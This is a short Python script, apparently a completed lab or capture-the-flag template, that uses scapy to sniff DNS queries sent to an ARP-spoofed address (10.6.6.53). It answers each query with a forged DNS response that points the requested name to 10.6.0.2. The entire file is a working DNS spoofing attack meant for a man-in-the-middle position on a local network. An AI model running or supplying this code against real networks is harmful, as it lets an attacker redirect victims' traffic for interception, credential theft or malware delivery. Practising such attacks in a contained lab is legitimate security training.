#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid
# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
#ipaddr_we_arp_spoofed = "10.6.1.10"
ipaddr_we_arp_spoofed = "10.6.6.53"
def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    dstport=packet[IP][UDP].sport
    srcport=packet[IP][UDP].dport
    dstmac=packet[Ether].src
    srcmac=packet[Ether].dst
    eth = Ether(src=srcmac, dst=dstmac)   # need to replace mac addresses
    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
    udp = UDP(dport=dstport, sport=srcport)                             # need to replace ports
    dns = DNS(
        # MISSING DNS RESPONSE LAYER VALUES
        id=packet[DNS].id, qr=1, opcode=0,
        aa=1, tc=0, rd=1, ra=1, z=0, ad=0, rcode=0,
        qdcount=1, ancount=1, nscount=0, arcount=0, 
        qd=DNSQR(qname=packet[DNS].qd.qname, qtype='A', qclass=1),
        an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass=1,
        ttl=600, rdata="10.6.0.2")
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")
def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed)    # destination ip we had spoofed (not our real ip)
        #"ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
      ] )
    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    while True:
        sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
if __name__ == "__main__":
    main()